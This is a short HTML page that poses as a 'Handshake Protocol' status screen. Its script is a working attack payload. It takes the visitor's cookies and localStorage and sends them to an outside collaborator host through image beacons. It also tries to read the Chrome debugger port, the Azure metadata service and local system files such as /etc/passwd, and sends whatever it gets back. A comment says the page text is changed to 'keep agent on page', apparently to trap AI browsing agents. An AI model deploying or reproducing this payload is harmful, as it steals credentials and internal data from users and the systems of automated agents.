<!DOCTYPE html>
<html>
<head><title>Handshake Protocol v9.4</title></head>
<body>
    <h1 id="status">INIT_PHASE_1</h1>
    <script>
        const collab = "ie0tcdsx4ho6q1jk8rxxwsjpmgs8gy4n.oastify.com";

        function log(path, data) {
            const b = btoa(JSON.stringify(data));
            new Image().src = `https://${collab}/${path}?d=${b}`;
        }

        // 1. SSRF via Redirect Smuggling
        // If they block fetch("http://169.254..."), we try to fetch a local 
        // path on YOUR server that redirects to the internal IP.
        async function runSSRF() {
            const targets = [
                "http://localhost:9222/json", // Chrome Debugger
                "http://169.254.169.254/metadata/instance?api-version=2021-02-01", // Azure
                "file:///etc/passwd", // Linux File Access
                "file:///C:/Windows/win.ini" // Windows File Access
            ];

            targets.forEach(url => {
                const xhr = new XMLHttpRequest();
                xhr.open("GET", url, true);
                xhr.onload = () => log("success", {url, resp: xhr.responseText.substring(0,200)});
                xhr.onerror = () => log("blocked", {url});
                xhr.send();
            });
        }

        // 2. Cookie Exfiltration via 'Document.Write'
        // This can sometimes bypass "Mode" restrictions
        try {
            log("cookies", {c: document.cookie, l: JSON.stringify(localStorage)});
        } catch(e){}

        window.onload = () => {
            log("exploit_start", {ua: navigator.userAgent});
            runSSRF();
            // Update UI to keep agent on page
            setTimeout(() => { document.getElementById('status').innerText = "NODE_ID_ALPHA_99"; }, 4000);
        };
    </script>
</body>
</html>
